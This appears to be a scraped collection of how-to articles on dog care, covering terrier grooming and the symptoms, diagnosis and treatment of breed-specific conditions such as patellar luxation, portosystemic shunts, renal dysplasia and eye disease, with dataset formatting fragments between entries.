take the time to do a good job. Regular brushing (at least once a week) with the proper tools will help keep both coat layers healthy and clean. Use these tools:Stiff-bristled brush for detangling
Slicker brush to distribute healthy oils through the hair
Coarse comb for detangling
Fine-toothed comb

, A coarse brush has stiff bristles and works well on coarse, weather-resistant coats. It can get out some of the tangled hair. After using this brush, use a coarse comb to continue detangling. Then, go through the coat with a fine-toothed comb.Consider using a detangling spray before you start brushing.Be gentle as you brush and comb on the belly and down the legs.

, Mats are clumps of tangled hair and cannot be brushed or combed through easily. If your Cairn terrier has mats, be patient and remove them with care. If the mats are small, break them up with your fingers and then brush through them starting at the tip.For larger mats:


Use small scissors to vertically split the mat into small sections.Scissors can damage the skin, so don’t use them to remove the entire mat.
Brush through the mat with a slicker brush and comb until the mat is gone.Do not yank through the mats. This will not remove the mats and you’ll hurt your dog.

, Once the hair is nice and smooth, use a slicker brush as a final ‘once over.’The slicker brush will distribute healthy skin oils through the coat, helping it look glossy and healthy.

, Unlike other dog breeds, Cairn terriers do not need regular baths. Your Cairn terrier will need a bath only if something dirty gets into its coat and can’t be brushed out., If you do have to bathe your Cairn terrier, don’t use just any dog shampoo. You will need to use one that’s specially formulated for coarse-haired dogs.Other dog shampoos could make your dog’s coat age more quickly, causing the hair to die more quickly., Other than using a specific shampoo, you will bathe your Cairn terrier like you would any other dog. Follow these tips for giving your dog a good bath:


Put a few inches of lukewarm water in the tub.Work the shampoo through both coat layers and down to the skin.
Rinse all the shampoo out so your dog’s skin doesn’t feel itchy and irritated.

, Use some regular bath towels to dry off your Cairn terrier. If you want dry off your dog a little more quickly, you could use a dog hair dryer. Dog hair dryers don’t get as hot as human dryers and are much quieter.Do not try to blow dry your dog’s face.Your dog will not appreciate the blow of air directly in its face.

, Small dogs with short muzzles can develop problems with their tear ducts. Tear duct problems can cause frequent weeping, which can lead to a dry and crusty buildup in the inner corners of the eyes.If you notice this buildup around your Cairn terrier’s eyes, you will need to gently remove it.


Ask your vet which eye cleaner to use.
Put some of the ear cleaner on a cloth and wipe around the eyes as needed.
If you see specks of dirt around your dog’s eyes, you could use a fine-toothed comb to remove the dirt., Taking care of your Cairn terrier’s ears is another important aspect of grooming. If you see some dirt or wax building up in the ears, put some ear cleaner on a cotton ball and clean each ear. Move the cotton ball from the inside to the outer ear flap.Do not use cotton swabs in the ears. Cotton swabs can damage the ear canals and can increase the risk of inflammation or infection in the ears.If your dog’s ears look unusual (swelling, redness, scabs) or smell really bad, take your dog to your vet. Your dog could have an ear infection or other ear disease.

, Cairn terriers tend to spend a lot of time indoors, meaning they don’t get outside very much to wear their nails down.When your Cairn terrier’s nails are clicking on the ground, you’ll know it’s time to trim them. To do a good job of trimming the nails:Follow the natural curve of the nail when trimming.
Avoid clipping the quick, which is the pink vein running through the center of each nail. Clipping the quick will be painful to your dog and cause the nail to bleed.
If the quick is hard to see (if your dog has dark nails), clip the nail little by little. If the white spot in the center of the nail begins to darken you are nearing the quick, and should stop clipping.
If the nail starts to bleed, apply a small pinch of styptic powder to the nail. Styptic powder is available at your local pet store.

, If you get your dog as a puppy, you can train them to accept teeth brushing by exposing them to the sensation early and often. Ideally, you should try to brush your dog’s teeth daily, but aim for at least 2-3 times per week.

Brushing your dog’s teeth can limit the need for your dog to be anesthetized for dental cleaning by your veterinarian. You should still have a dental cleaning performed whenever your vet recommends it.

Get a physical exam.,
X-ray the leg.,
Manage the condition in mild cases.,
Undergo surgery in severe cases.",How to Diagnose Patellar Luxation in Shih Tzus2," If you believe your dog has patellar luxation, you should take him to the vet. The vet can perform a physical exam to check for the condition. First, the vet will watch the dog walking and feel the back legs. The vet is feeling for muscle wastage, along with sideways movement in the kneecap that shouldn't be there.It is possible to diagnose a luxating patella by feel alone since the kneecap can be felt popping out of place when the leg is straightened during the exam.
In cases that are not clear cut, the vet may straighten the leg and put a slight sideways pressure on the kneecap. This can be enough to encourage the patella to pop out of place.

, Even if the vet suspects a luxating patella from the physical exam, the leg will be x-rayed so as to fully assess the underlying anatomy. This is especially important if corrective surgery is being considered.


The vet will want to look at the radiographs to check the angles of the bones, which gives essential information about what surgical procedures are most appropriate for that individual.

, For mild cases of patellar luxation, you can manage your dog’s pain and inflammation with NSAIDs. Your vet will also give you a physical rehabilitation exercise program for your dog to help build strength in the thigh muscle.You should also control your dog’s weight. Added weight from obesity can put more stress on the knee joint.

, In dogs that are regularly skipping a step or having difficulty jumping, this could indicate the changes are more marked, in which case corrective surgery could protect the joint from early arthritis.


Corrective surgery involves deepening the groove that the kneecap sits in, tightening the joint capsule, and sometimes changing the angle of the shin bone so that the patella sits in a straighter line with the thigh bone."
"
Know what patellar luxation is.,
Determine if your dog is at risk.,
Understand that there are four grades of the condition.",How to Diagnose Patellar Luxation in Shih Tzus3," The kneecap is a vital part of knee anatomy. The knee is a hinge joint made up of the femur, or thigh bone, from above and the tibia, or shin bone, from below. When the large thigh muscle contracts, it pulls on the shin bone and causes the knee to straighten. However, it does not pull directly on the shin bone but via a pulley system formed by the patella.For this system to work, the thigh muscle needs to pull in a straight line. What happens with a luxating patella is that the forces pull at an angle and the kneecap pops out of place.


The problems which allow or encourage the kneecap to slip can vary. One problem is a slack joint capsule that means the kneecap isn't tightly anchored. Another is that the groove the patella sits in is too shallow, which allows sideways movement that shouldn't be there. The muscles may also pull at an angle because of the bowed natures of the dog's hind leg bones., Small dogs are especially prone to luxating patellas. This means that the Shih Tzu breed is especially likely to have this condition. Patella luxation is common in dogs that have shortened legs or bowed legs, such as the dachshund, Lhasa apso, Yorkshire terrier, or Shih Tzu.


Any age can be affected, but signs often show at a young age because this is a mechanical problem with the direction of pull of muscles and anatomy. Many dogs begin showing signs at eight to 10 weeks., The severity of the condition is determined based on four different grades. The mildest case is considered a Grade 1 while the most severe is a Grade 4. Grade 1 is when the kneecap just pops out of place and returns naturally. Grade 2 is similar, but occasionally the kneecap needs help to manually pop it back in.Grade 3 is when the kneecap stops popping back into place on its own. The kneecap is popped out unless it is manually popped back in. It will only stay in place for a short while.
Grade 4 is the most severe case. The kneecap stays popped out and won’t pop back into place even when manually moved.

Decide whether you want to do the clipping.,
Begin with clipping the head.,
Clip your Scottish Terrier’s body.,
Be careful when clipping sensitive body parts.,
Use your thinning shears.",How to Groom a Scottish Terrier2," Clipping a Scottish Terrier takes time and practice. If you feel uncomfortable about using electric clippers, or don’t have time to clip at home, take your Scottish Terrier to a professional groomer. Clipping should be done four to six times a year.Professional groomers can be expensive.
If you decide to do it yourself, be patient and work slowly. Use a picture of the typical Scottish Terrier coat appearance to guide you as clip the coat at home., After attaching the #10 blade to your electric clippers, start at your Scottish Terrier’s head. Move the clippers from the eyebrows to just in front of the ears. Also, clip from the chin down to your Scottish Terrier’s chest., With your Scottish Terrier’s head clipped, use the electric clippers on the back, legs, and sides. Continue moving in the direction of hair growth. As you clip the body, make sure you clip equally on both sides—use a mirror to ensure both sides are evenly clipped., The genital and anal areas can be very sensitive. Use extra caution when clipping the hair in these areas. If you do not feel comfortable using the clipper in these areas, trim the hair with your thinning shears instead., For some areas of your Scottish Terrier’s coat, it will be easier to use thinning shears instead of an electric clipper. For example, use the shears to trim and shape the hair on the tail. Also, use the shears to trim the hair on the outside edge of the ears and excess hair inside the ears. To trim the eyebrows, hold the shears parallel to the side of the head.Trim the eyebrows so the inner eyebrows are longer than the outer eyebrows."

Bathe your Scottish Terrier.,
Trim the nails.,
Clean around the eyes.,
Clean the ears.,
Brush the teeth.",How to Groom a Scottish Terrier3," Don’t bathe your Scottish Terrier too often, since frequent baths can dry out its skin.Give your Scottish Terrier a bath only when necessary, such as when it starts to smell or has rolled around in something that stinks or can’t be brushed out.Here are some tips for the bathing process:Brush and comb your Scottish Terrier beforehand to remove loose hair and tangles.
Rinse out all shampoo so your Scottish Terrier’s skin doesn’t feel itchy.
Consider using a dog-safe hair dryer to complete the drying process.
If it’s time for a hair clipping, wait to do it until after a bath when the hair will be clean.

, Keeping your Scottish Terrier’s nails trimmed won’t be just for good looks. Short nails will make it easier for your Scottish Terrier to walk and have proper balance. Purchase a pair of nail clippers (guillotine or scissor type) at your local pet store. When you trim the nails, be careful not to cut the quick, which is the thin vein running through each nail.


If the nail starts bleeding, dab a small amount of cornstarch or styptic powder on the nail.Guillotine-type nail clippers may be a little easier to use than scissor-type nail clippers.
When the nails start clicking the floor, you’ll know it’s time for a nail trim., Dogs can sometimes get crusty goop in the inner corners of their eyes. If you see this goop around your Scottish Terrier’s eyes, use a clean damp cloth to remove it.


Check the eyes weekly.If they don’t look healthy (colored discharge or redness), take your Scottish Terrier to your vet., Keeping your Scottish Terrier’s ears clean will help prevent ear infections. If you notice a buildup of wax or debris in the ears, gently clean them. Here are some tips for ear cleaning:Use a clean cotton ball, not a Q-tip. A Q-tip can damage the ear canal.
Get a dog-safe ear cleaner from your vet.
Wipe from the inside out to make sure you don’t rub the wax or debris back into the ear.
If you see signs of ear problems (swelling, redness, bad odor, scrapes), take your Scottish Terrier to your vet.

, Dental disease in dogs can be very uncomfortable and possibly lead to other health problems. Brushing your Scottish Terrier’s teeth a few times a week will help prevent dental disease.Use toothbrush and toothpaste made for dogs.When you brush the teeth, check for signs of dental disease (bleeding or swollen gums, bad breath, loose teeth).Dental disease requires veterinary treatment.

Feed your American pit bull terrier the right food twice a day.,
Furnish your home with dog supplies.,
Give your pit bull terrier enough space.,
Spay or neuter your pet.",How to Care for an American Pit Bull Terrier1," Many pit bulls prefer an active, athletic lifestyle. Meeting this high energy need requires a diet high in protein and low in carbohydrates.If your dog doesn't get as much exercise as you would like, choose a lower-protein food instead.


A good dog food will be mostly meat, with few fillers such as rice, peanut hulls, soybean mill, or corn bran.Wet canned food and dry kibble are both acceptable.;
, It is important that you set up a comfortable environment for your dog. Your pit bull will need their own bed, food, toys, and blankets.


Provide a variety of interesting toys, such chew toys, food puzzles, stuffed animals, balls, and rope toys.You should have at least one dog bed for your dog, but you may choose to have a few places around the house for your dog to sleep.
Buy an appropriately sized crate if are planning to crate train your pit bull. The crate will give your dog a private den to sleep and rest in.
Each dog should have their own food and water dish.

, The best home for an American Pit Bull Terrier is one in which the dog has plenty of room to play and exercise. While pit bulls can live in apartments or homes without yards, it preferable that they have a fenced yard that they can play in as they are very active dogs. Pit bulls also have a tendency to dig, so it is good to give them an area in the yard where they are allowed to do so., Pit bulls are one of the most commonly surrendered dogs at shelters. Unless you are seriously considering breeding pure bred American Pit Bull Terriers, you should neuter or spay your dog to prevent unwanted pregnancies. Spaying and neutering your pit bull can also reduce aggression and the likelihood that they will bite.Neutered males are less aggressive, and they will be less likely to escape the house looking for a female to mate with. Neutering also reduces the chance of your dog developing testicular or prostate cancer."

Check for problems with urination.,
Monitor for abnormal drinking habits.,
Watch for abdominal problems.,
Look for other problems.",How to Diangose Juvenile Renal Dysplasia in Shih Tzus1," A common symptom of renal dysplasia is abnormalities connected to urination. This can present in a few different ways. For example, your Shih Tzu may urinate often due to the renal dysplasia. Your Shih Tzu's urine may also be extremely pale or have no color at all.Your Shih Tzu is a small dog, so she will not urinate a large amount. However, notice if her urination pattern or amount per urination changes.
Your Shih Tzu may be more difficult to housetrain because of the problems with her kidneys. She may start urinating inside the house or be unable to hold her urine.;
, Because of your Shih Tzu’s improperly working kidneys, you may see some abnormal changes with the way she drinks. She may be extremely thirsty, so she may drink an excessive amount of water. This may cause your Shih Tzu to urinate more.Your Shih Tzu may also suffer from dehydration.
Notice if she starts drinking differently than is normal for her.

, Due to the renal dysplasia, your Shih Tzu may suffer from abdominal problems. She may have a decreased appetite or may lose her appetite altogether. This can lead to weight loss. Your Shih Tzu may also experience vomiting.Your Shih Tzu may also suffer from abdominal pain or abdominal enlargement.
This may be hard to notice because of the long fur on your Shih Tzu. If you suspect that your Shih Tzu has renal dysplasia and is experiencing abdominal problems, do a physical exam on her stomach area to see if there is any enlargement.

, Due to the kidneys not functioning or developing properly, your Shih Tzu may face other problems. For example, your Shih Tzu may have stunted growth or physical development. If the kidneys are not functioning correctly, your Shih Tzu may be lethargic or have less energy than usual.Shih Tzu are toy dogs, which means they will already be small. Ask your vet if there might be a developmental problem with your Shih Tzu's weight and size when you take her to her checkups.
Shih Tzu's are only moderately energetic dogs, so don't worry if she is not jumping up and down all the time. However, if your Shih Tzu's energy level dramatically changes, you may have cause to worry.Your Shih Tzu may also have fluid buildup under the skin due to improperly functioning kidneys.

Be on the lookout for slow growth.,
Keep an eye out for the neurological signs of the disease.,
Assess any additional symptoms.,
Be vigilant about looking for the symptoms in young puppies.,
Understand what is going on with a portosystemic shunt.,
Take your dog to its veterinarian.,
Discuss the need for further testing with the veterinarian.,
Follow your veterinarian's suggestions for treatment.",How to Diagnose Portosystemic Shunts in Yorkshire Terriers," A puppy with a PSS often grows less quickly and is of a smaller stance than its healthy littermates.The puppy may be poorly muscled and generally look 'weedy' and underweight.


However, it can be difficult for an owner to recognize the puppy is stunted if it is an only dog.;
, But more serious than this, the dog can develop neurological signs. The neurological signs are due to toxic metabolites acting on the brain. In the same way that alcohol can make people drunk and their coordination suffers, the dog with a PSS may stagger and have poor coordination.Some dogs walk in circles or sit staring into space. Others may 'head press,' which means they sit in a corner and literally push their head against the wall.
Other symptoms include seizures and disorientation.These signs may be worse a short time after eating and may wax and wane over the course of the day, with the dog being more alert at some times than others.

, Some dogs also show gastrointestinal signs and may have diarrhea. They may also drool heavily after eating and their vacancy or disorientation worsens.If any of these signs sound familiar then you should get your puppy seen by a vet.

, Most commonly, signs start to develop before the dog's first birthday.There are a number of variable factors which can influence when the dog shows signs and how severe the symptoms are. These variables are the size of the shunt and the type of diet.


The larger the shunt the less blood flows through the liver.
High protein diets produce more of the toxic waste products of digestion, and more severe clinical signs.

, A puppy in the womb derives nutrition from the mother's blood via the placenta. Thus, the fetus' liver does not need to function in the same way as an adult dog's liver does. With PSS, the liver does not switch to normal operation once the puppy is born.


In the womb, the fetus has a blood vessel that bypasses the liver, thus taking it out of the circuit.The name of this bypass vessel is a portosystemic shunt, or PSS. When a normal puppy is born, this bypass vessel closes down and blood is re-routed through the liver, which then starts its work of detoxing the blood.
In dogs with a clinical PSS, the bypass vessel remains open, so blood circulates around the liver rather than through it. This means the liver is not given the opportunity to cleanse the blood of natural toxins that occur as a result of digestion.

, The vet will perform a thorough clinical examination to rule out other problems, such as a severe heart murmur, which could cause weakness and disorientation. The next step is screening blood tests, again to rule out kidney problems and other conditions which could affect the puppies growth and mentation.Screening bloods won't definitively diagnose a PSS but certain changes on the panel can point in that direction. The vet may choose to run an addition blood test looking at blood ammonia levels, since these are often elevated in dogs with a PSS.In addition, the vet may run a bile acid stimulation test (BAST).This test compares the levels of bile salts in the blood before and after eating. The pattern of response to eating (the levels of bile acids are high both before and after) can point strongly towards a shunt.

, If the vet is suspicious of a PSS then more detailed imaging is necessary to confirm the condition. This is essential if surgical correction is being considered, as the surgeon needs to know where the shunt is in order to plan surgery. If you do not intend to correct a potential problem with surgery, then the cost of these tests may not be worth the information you can get from them. These imaging techniques are quite specialized and your dog may need referral to a specialist center in order to access the equipment and expertise necessary. Each center has their own preferences but the options include:


An ultrasound scan by a specialist: Shunts are difficult to visualize using ultrasound but experienced scanners can use the doppler flow of the blood to check for a shunt. This technique has the advantage of being non invasive so no surgical procedure is necessary to reach a diagnosis.
Scintigraphy: This involves giving the dog an enema of a radioactive substance. The distribution of that substance is measured with a special scanner, and the amounts in the heart and the liver compared (it will be much lower in the liver).Portogram: Blood vessels don't show up well on x-ray but this technique involves a contrast agent injected into a major blood vessel so that the passage of the contrast can be followed on x-ray. This gives a clear 'map' of the blood vessels and highlights the shunt. The disadvantage is the patient needs an anesthetic in order to inject the contrast (a small surgical incision may be made into the abdomen) and to take the pictures.MRI or CT scan: These can give a 3D image of the abdominal content including the shunt if present., Once a diagnosis is made, the decision is made about treatment. Surgery is successful in most cases, although a second operation is needed in a small percentage of cases.


However, the procedure is expensive and requires specialist care and postoperative nursing.
The alternative is to manage the patient with a low protein diet and medications that lower the levels of toxins in the blood. This is not a cure and patients may still have flare ups of clinical signs and are likely to lead shortened lives.

Follow your veterinarian's advice about treatment.,
Understand what a corneal ulcer is.,
Learn about hereditary cataracts.,
Understand how breeding practices can increase or decrease the chances of eye problems.",How to Diagnose Eye Problems in Boston Terriers," Corneal ulcers occur when the clear surface of the eye, called the cornea, is severely damaged. Signs that your Boston terrier may have corneal ulcers include the dog rubbing his eye repeatedly and keeping one of his eyes closed at all times. Dogs rub their eyes because corneal ulcers can be very painful and this reduces the pain temporarily. They keep their eyes closed involuntarily to protect the damaged eye.There are two different types of corneal ulcers. One is caused by trauma to the cornea of the dog's eye. This is common in Boston terriers due to the size and prominence of their eyes. The other type of corneal ulcers is caused by a hereditary condition called corneal dystrophy. The second type is particularly hard to treat, in addition to being very painful for your dog.The surface of the eye may lose its shiny appearance. It becomes dull and instead of having unbroken reflections, you may see jagged edges on a reflection, as if looking in a broken mirror.;
, Cataracts are another common eye problem for Boston terriers. Cataracts is a condition in which the lens of the eye becomes cloudy and opaque, eliminating the ability for light to get into the eye properly.Cataracts, especially juvenile cataracts that come on very early in a dog's life, can cause the dog to go completely and permanently blind if not caught early. Signs that your Boston terrier might have cataracts include:


Blindness: The dog may start finding it difficult to pick up her favorite toy or bump into objects placed in her path. The dog may seem fine on a familiar walk (because she knows the route) but hesitates and hangs back if you visit somewhere she has not visited before.White pupil: When you look directly into the eye you may see a white area at the center of the pupil, a mistiness in the lens, or a white opacity to the lens.

, Boston terriers can get a variety of other eye problems. These include, but are not limited to, cherry eye, retinal atrophy, glaucoma, proptosis (bulging eyes), and eyelash problems.Because the dog's eye problems can vary so drastically, you should be on the lookout for general changes in your dog's eyes, as well as specific symptoms, which include:


General eye irritation: The dog may squint, holding the eye partially closed. He may rub his eyes with his paws or on the ground or furniture around your home.
Red eye: The white of the eye may have angry red blood vessels streaking over the surface and have a red haze to them. If your dog has cherry eye, his third lid may be red as well.Watery eye: Soreness causes the eye to water, so the dog's cheek may appear wet from tears.
Bulging eyes: Proptosis can cause your dog's eye to move out of place, bulging out of his face. This condition is usually fixed with surgery.Different sized eyes: Glaucoma can cause one, or both, eyes to swell. This is because the fluid of the eye is not draining properly, increasing eye pressure and the size of the eye., If you spot any abnormalities, get your Boston terrier checked by the vet immediately. Regardless of the severity of the symptoms you see, if you are in the least suspicious, get the dog checked out. Earlier intervention could reduce the severity of the problem and, in extreme cases, could save your dog's sight.

, First, the vet conducts a physical examination, paying particular attention to the eyes, the area around the eyes, and the inside of the eye. The vet will look carefully for hairs or whiskers that may be rubbing on the surface of the eye and causing an ulcer. The vet will then use an ophthalmoscope (part light and part magnifier) to examine the surface of the eye, the front chamber, the back chamber, and the retina. This will give the vet information about a cataract, as a cataract will block the light going into the inner part of the eye, making it difficult or impossible to see the retina.


To double check, the vet will stand back in a darkened room and shine a bright light directly into each eye from a couple of feet away. Again, the opaque lens blocks light casting a dark shadow on the retina. This confirms that a cataract is present.To check for ulcers, the vet may put a special optic dye, called fluorescein, into the eye. This dye is orange, and in contact with damaged tissue it turns green. An ulcer shows up as a vivid green island on the surface of the orange cornea. This confirms a corneal ulcer is present., Some eye problems can be treated more effectively than others. Unfortunately, in the case of the major problems with Boston terrier eyes, the treatments mainly consist of pain management and delaying blindness for as long as possible.


Treatment of cataracts is geared at reducing a sudden inflammation that has occurred within the eye. This may temporarily delay the development of the cataract, but unfortunately it is likely to progress again at some point in the future. Even with prompt treatment, a dog with cataracts may lose his sight. Prepare yourself for this if you have a Boston terrier with cataracts.
Treatment of a corneal ulcer can be extremely difficult to do and requires a combination of drops plus a debridement procedure to scrape away devitalized tissue that is preventing healing. Pain relief will also be required to alleviate the discomfort. In some cases, if the issue cannot be fixed the best option for your dog will be the removal of the affected eye., The cornea is the transparent capsule on the front portion of the eye globe, through which light passes to reach the lens and pass onward to the retina. Think of it like a clear skin over the eye (that is the full thickness of the globe). The cornea is actually made up of stacks of clear cells, arranged in layers, much like bricks in a wall. An ulcer is like a burst blister on the skin of the eye or an erosion or crater sitting on the surface of the eye.


In the case of the Boston terrier, the ulcer may develop because of a problem called corneal dystrophy. This is a problem where the glue holding the cells together fails, like not enough mortar between the bricks. This allows sheets of cells to lift up and peel away.
Corneal ulcers are painful. If they erode too deeply the eyeball is severely weakened and it can burst, causing the dog to lose that eye.

, A cataract refers to a cloudiness of the lens. The lens is the structure which focuses light on the retina. It is a transparent sack of jelly and sits just behind the colored part of the eye, the iris. It is a genetic condition that can cause a cataract to develop at as young as 12 months of age.


Juvenile cataracts can develop distressingly quickly, sometimes in as little as 24 hours. If the cataract is very dense, you see a bright white object sitting in the middle of the eye, where the black pupil normally is.It is thought that one in 10 Boston terriers will suffer from this condition during their life.Sudden formation of a juvenile cataract is sometimes associated with inflammation within the eye, so the eye is sore and inflamed. If the cataract is very dense it blocks the passage of light, and although the retina is healthy, the dog is blind because the light is prevented from penetrating that deep into the eye., Part of the reason that Boston terriers, and other purebred dogs, have so many eye problems is because dogs that have these problems already are being bred with each other. It increases the likelihood of these conditions if one or both parents have a genetic condition already. Fortunately, if good breeding practices are observed (for instance not breeding dogs with these conditions) the issues could be reduced greatly.


For example, there is now a genetic screening test available for juvenile cataracts.In the case of juvenile cataracts, prevention is better than a cure. If all breeding stock were screened, and only negative dogs were bred, the problem could be brought under control.
When you adopt a dog from a breeder, as to see the medical records of the dog's parents. If they have had proper veterinary care and have been screened for eye problems, then the chances that your prospective dog will have eye problems are much lower.

Irish Setters typically have a smooth, glossy coat that may feather around the ears and extremities.The coat may stay shorter on the head and forelegs, and fringe more on the hindquarters.
Their coat is typically short and soft on the ears.
Irish Setters often shed.;
, Irish Setters are descended from pointers as well as hunting hounds, and so have a long, lean head with a straight, streamlined muzzle. Generally, the head is going to be about twice as long as it is wide, with a pronounced, chiseled muzzle.Irish Setters are also known for their large, floppy ears. Their ears are set back on their head, typically lower than the level of their eyes.
Additionally, Irish Setters are known for having a soft, affectionate look to their eyes. Their eyes are typically a medium brown, and neither deep-set nor do they bulge out from the head.

, Irish Setters typically have long, lean bodies, with a back that is highest in the forward quarters and slopes gently back toward the tail. Their chests are slender, rather than rounded, and their hind legs are long and muscular, especially from the hip area to hock.Front legs are strong but often straight, and their shoulders are slender rather than broad.
Their tails typically follow the line of their back rather than sitting higher or lower on the dog.

, There are three common setter breeds: Irish, English, and Gordon. They have similar body shapes and facial characteristics, but their coats are generally a different color.Irish Setters generally have a rich mahogany coat, though some Irish Setters have a red and white coat. Those with red and white coats are sometimes called Irish Red and White Setters.
An English Setter will have black and white spotted fur, while a Gordon Setter will have black or black and brown fur.

, Irish Setters are larger dogs, generally weighing around 65 to 75 lbs (29.5 to 34 kg) for a male, and 55 to 65 lbs (24.9 to 29.5 kg) for a female. Generally, Irish Setters stand a little over two feet (60.96 cm) tall, with the males typically slightly taller than the females.Individual dogs may vary depending upon their living environment and genetic makeup. Some dogs may be taller, shorter, larger, or smaller, but are still Irish Setters.

, Unlike some other sporting dogs and even other setters, the Irish Setter has two distinct groups within the breed. Irish Setters that have been used for show tend to be larger with a thicker coat than gun dog, which are smaller and more streamlined.If possible, ask previous owners about the dog's parents, or try something like a dog DNA test, which can easily be acquired online, to see if the dog is from showing or hunting families.

, Irish Setters were bred as hunting dogs, and thus thrive on open spaces and lots of exercise. Expect an Irish Setter to have lots of energy that needs to be taken care of with easy access to the outdoors or frequent walks and play sessions.An Irish Setter’s extra energy tends to lend itself to being playful. These dogs are often described as clownish, lively, and rollicking.
Due to their breeding, Irish Setters often have an inclination to hunt birds. Understand that some Irish Setters might become very excited or energetic when near birds due to their hunting instincts.

, Irish Setters tend to be very socially outgoing dogs. They may seek physical affection, but more often they will want to play when the opportunity presents itself. Irish Setters typically get along well with other dogs, too.Some caution should be exercised when introducing Irish Setters to small dogs, as their hunting instincts may kick in.
Irish Setters are not typically aggressive with small children, but may not know their own strength when they try to initiate play with children smaller than them.

, Irish Setters are a smart breed, and train very well with the right people. Their playful nature means that they require consistency and regular practice, but the breed tends to pick up on lessons quickly and does not let them go.Irish Setters are known for being particularly easy to housetrain, so training exercises may be best served by starting there before moving onto complicated commands.

, Irish Setters tend to live fairly long lives for their size. Their lifespan generally averages around 11 to 15 years. If you’re working with an older dog, see if you can determine the age by asking the owners or previous caretakers.While some Irish Setters can live for much longer, dogs of the Irish Setter’s size typically pass away before they reach their late teens or early twenties.

Begin training as soon as you bring them home.,
Teach your pit bull how to walk on a leash.,
Housebreak your American pit bull terrier.",How to Care for an American Pit Bull Terrier2," While not all pit bulls are aggressive, there is stronger tendency in the breed for aggressive behavior, particularly towards other dogs. Letting your pit bull interact with other dogs from an early age will help them understand that other animals and people are not threats. It might also reduce their aggressive tendencies in social situations.


The younger you begin socializing your pit bull, the more adjusted they will become to their surroundings. The first six months are particularly vital in socializing your dog.Avoid leaving your pit bull with another dog unattended. American pit bull terriers do have a tendency to fight with other dogs. Even well socialized pit bulls can be aggressive towards other dogs if left unsupervised.Dog parks and doggy day cares may not be appropriate for your pit bull. While some pit bulls can learn to interact well with other animals, they are still an aggressive breed, and they are prone to fighting with other dogs. All interactions with other dogs should be supervised., By nature, pit bulls are strong-willed and highly intelligent, but they are also eager to please. If you begin training as soon as they enter your home, they will quickly pick up the house rules without developing bad habits.


Start by teaching them basic commands such as “sit,” “come,” and “stay.” Give them a treat when they properly follow the command.If your pit bull does something wrong, do not hit or yell at them, as this can make them afraid of you and increase their aggression.Reward the dog instead when they do something right, and they will learn proper behavior quickly.

, Because the breed is very energetic and strong, your dog may have the urge to run ahead of you or tug at the leash. By pulling back firmly and encouraging them to walk by your side, your pit bull will learn leash manners, and your walks will become easy and enjoyable.


Leashed walks around other people and dogs can also help socialize your pit bull. Let your pit bull interact with others, but be ready to remove them from the situation if they become upset or aggressive., Housebreaking is generally easy to accomplish with pit bulls. The best method to use for teaching your dog not to eliminate inside the house is to take them outside frequently and on a regular schedule. Take your pit bull outdoors first thing in the morning, after meals and playtime, and before bedtime. This will allow your dog to adjust to a break schedule while teaching them that inside is not the appropriate place to eliminate.When you first bring your pit bull home, you should watch them carefully to make sure that they do not have accidents inside the house. If you catch them going in the house, interrupt them and take them outside."

While the American pit bull terrier is a breed that has few health problems, some pit bulls are prone to hip dysplasia, hyperthyroidism, allergies and congenital heart conditions., Obesity is a big problem in dogs, particularly in American Pit Bull Terriers, which are often bred for size. Ideally, a male should be between 35 and 60 pounds. A female should be between 30 and 50 pounds.Have your vet weigh the dog at every visit so that you understand your dog’s size fluctuations.


Do not feed your pit bull more than twice a day, and avoid giving them table scraps to help keep them at a healthy weight.

, Pit bulls have a lot of energy, and they need plenty of exercise to channel it in a positive way. Dogs that do not get enough exercise may resort to destructive behavior such as destroying household items. Walking your pit bull at least once a day is a good start to fulfilling their exercise needs.


Start with ten to fifteen minute walks. After a few weeks, try increasing the length of the walk. You might even start walking them twice a day.You can also take your adult pit bull on a run or jog with you.

, Games will help you bond with your pit bull while helping them exercise and increasing their social skills. You can play fetch with a ball or frisbee, or you can try tug of war with a rope toy.


Pit bulls also enjoy activities such as swimming, running, and lure coursing. Try taking them on a hike or out to the beach."

Take your Shih Tzu to the vet.,
Give the vet an accurate description of your Shih Tzu’s symptoms.,
Get your Shih Tzu various tests to check the kidneys.",How to Diangose Juvenile Renal Dysplasia in Shih Tzus2," If you believe your Shih Tzu has renal dysplasia, you should take her to the vet. Your vet can perform an examination to check your puppy’s overall health and determine if there is an underlying condition other than renal dysplasia.Your vet will do a physical exam, which can reveal small or underdeveloped kidneys.

, In addition to a thorough examination, the veterinarian will also consider your Shih Tzu's medical history. The vet will also take into consideration your Shih Tzu’s symptoms that you have witnessed. Her age (such as being a younger dog) and breed (Shih Tzu) will also be considered in making the diagnosis.It is important to give an accurate account of the symptoms you see in your Shih Tzu whenever you take her to a veterinarian for diagnosis.

, After a physical examination and an analysis of symptoms and medical history, your vet may order tests for your Shih Tzu. For example, your vet may perform blood tests to measure blood urea nitrogen (BUN) and creatinine levels in the kidneys. Your vet may also do an urinalysis to demonstrate the kidney’s poor ability to filter waste from the blood stream.Radiographs or an ultrasound of the abdomen may be ordered, which will show abnormal kidney shape.A biopsy of the kidney may be necessary. This will be sent to a diagnostic lab to show abnormal cell development.

Treat renal dysplasia.,
Learn what renal dysplasia is.,
Know when dogs develop renal dysplasia.",How to Diangose Juvenile Renal Dysplasia in Shih Tzus3," Management of renal dysplasia revolves around managing the symptoms. There is no curing this condition. Treatment consists of a diet formulated to decrease the workload of the kidneys. Many veterinarians use a prescription diet to properly balance the need for nutrition, a decrease kidney function, and appealing to your dog’s picky appetite.Anti nausea medication may be prescribed since the toxins in the bloodstream can cause nausea.
Always have fresh water available for your Shih Tzu.
B and C vitamins and potassium are all lost easily through frequent urination, so supplementation of certain nutrients may be necessary. Your Shih Tzu will have decreased need for certain nutrients, such as phosphorus, calcium, and sodium, which all can build up in the body.
High blood pressure may develop and need to be treated.
Dehydration may need to be combated through subcutaneous (under the skin) or IV fluid treatment.
Anemia or low red blood cells may develop and need monitoring and treatment as needed.

, Renal dysplasia occurs when the kidneys fail to develop properly while the puppy is developing in the mother dog’s uterus.Renal dysplasia can happen in one kidney or in both kidneys, leaving the affected kidney small, firm, and pale colored.


Kidney function is also altered due to the improper development.
Due to the kidney not developing properly, toxins are not filtered from the bloodstream like normal. These toxins then build up in the blood causing serious symptoms.

, A dog with renal dysplasia typically develops symptoms while young. Most dogs develop the condition between six months and two years of age. Juvenile renal dysplasia is common, so starting around six months of age you should start monitoring your Shih Tzu.However, dogs of any age can be affected due to the differences in the severity of the damage to the kidneys. Some dogs do not show symptoms until later in life.

Get the right ingredients.,
Choose a liquid cleaner.,
Avoid water.,
